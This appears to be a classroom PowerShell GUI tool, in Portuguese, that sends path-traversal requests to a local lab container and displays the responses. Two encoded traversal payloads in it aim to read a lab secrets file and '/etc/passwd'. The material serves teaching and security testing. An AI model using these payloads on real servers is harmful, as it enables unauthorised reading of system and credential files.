Set-StrictMode -Version Latest

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

Import-Module (Join-Path $PSScriptRoot "LabHttp.psm1") -Force

$proofPaths = [ordered]@{
    "Arquivo didático fora da rota pública" = "/public/.%2e/lab-secrets/segredo.txt"
    "Arquivo de identificação do sistema do container" = "/public/.%2e/.%2e/.%2e/.%2e/etc/passwd"
}

$form = New-Object System.Windows.Forms.Form
$form.Text = "Explorador controlado HTTP — Aula 04"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(900, 680)
$form.MinimumSize = New-Object System.Drawing.Size(760, 560)
$form.BackColor = [System.Drawing.Color]::WhiteSmoke

$title = New-Object System.Windows.Forms.Label
$title.Text = "Explorador controlado HTTP"
$title.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(24, 18)
$form.Controls.Add($title)

$warning = New-Object System.Windows.Forms.Label
$warning.Text = "Somente localhost: as provas são de leitura e não executam comandos."
$warning.AutoSize = $true
$warning.ForeColor = [System.Drawing.Color]::DarkRed
$warning.Location = New-Object System.Drawing.Point(26, 52)
$form.Controls.Add($warning)

$targetLabel = New-Object System.Windows.Forms.Label
$targetLabel.Text = "Alvo autorizado:"
$targetLabel.AutoSize = $true
$targetLabel.Location = New-Object System.Drawing.Point(26, 90)
$form.Controls.Add($targetLabel)

$targetBox = New-Object System.Windows.Forms.TextBox
$targetBox.Text = "http://127.0.0.1:8080"
$targetBox.Location = New-Object System.Drawing.Point(130, 86)
$targetBox.Size = New-Object System.Drawing.Size(270, 24)
$form.Controls.Add($targetBox)

$proofLabel = New-Object System.Windows.Forms.Label
$proofLabel.Text = "Prova:"
$proofLabel.AutoSize = $true
$proofLabel.Location = New-Object System.Drawing.Point(26, 130)
$form.Controls.Add($proofLabel)

$proofBox = New-Object System.Windows.Forms.ComboBox
$proofBox.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
$proofBox.Location = New-Object System.Drawing.Point(130, 126)
$proofBox.Size = New-Object System.Drawing.Size(545, 24)
foreach ($name in $proofPaths.Keys) {
    [void]$proofBox.Items.Add($name)
}
$proofBox.SelectedIndex = 0
$form.Controls.Add($proofBox)

$sendButton = New-Object System.Windows.Forms.Button
$sendButton.Text = "Enviar requisição"
$sendButton.Location = New-Object System.Drawing.Point(695, 124)
$sendButton.Size = New-Object System.Drawing.Size(150, 30)
$form.Controls.Add($sendButton)

$output = New-Object System.Windows.Forms.RichTextBox
$output.ReadOnly = $true
$output.BackColor = [System.Drawing.Color]::White
$output.Font = New-Object System.Drawing.Font("Consolas", 10)
$output.Location = New-Object System.Drawing.Point(24, 176)
$output.Size = New-Object System.Drawing.Size(820, 420)
$output.Anchor = [System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right
$form.Controls.Add($output)

$footer = New-Object System.Windows.Forms.Label
$footer.Text = "A evidência deve ser usada somente no relatório desta atividade."
$footer.AutoSize = $true
$footer.Location = New-Object System.Drawing.Point(26, 614)
$footer.Anchor = [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Bottom
$form.Controls.Add($footer)

function Set-ExploitOutput {
    param([string]$Text)
    $output.Text = $Text
    $output.SelectionStart = 0
    $output.ScrollToCaret()
}

function Invoke-ControlledProof {
    try {
        $target = Resolve-LabTarget -BaseUrl $targetBox.Text.Trim()
        $selectedName = [string]$proofBox.SelectedItem
        $path = $proofPaths[$selectedName]
        $response = Send-LabHttpRequest -Target $target -Path $path

        $lines = @(
            "ALVO: $($target.Display)"
            "MÉTODO: GET"
            "CAMINHO ENVIADO: $path"
            "STATUS HTTP: $($response.StatusCode)"
            "SERVER: $($response.Server)"
            ""
            "REQUEST LINE E CABEÇALHOS:"
            (Limit-LabText -Text $response.Request -Maximum 1200)
            "RESPOSTA:"
            (Limit-LabText -Text $response.Body -Maximum 14000)
        )

        Set-ExploitOutput -Text ($lines -join "`r`n")
    }
    catch {
        Set-ExploitOutput -Text ("Falha controlada:`r`n$($_.Exception.Message)`r`n`r`nUse somente http://127.0.0.1:8080 e confirme que o container está ativo.")
    }
}

$sendButton.Add_Click({ Invoke-ControlledProof })

$form.Add_Shown({ $targetBox.Focus() })
[void]$form.ShowDialog()
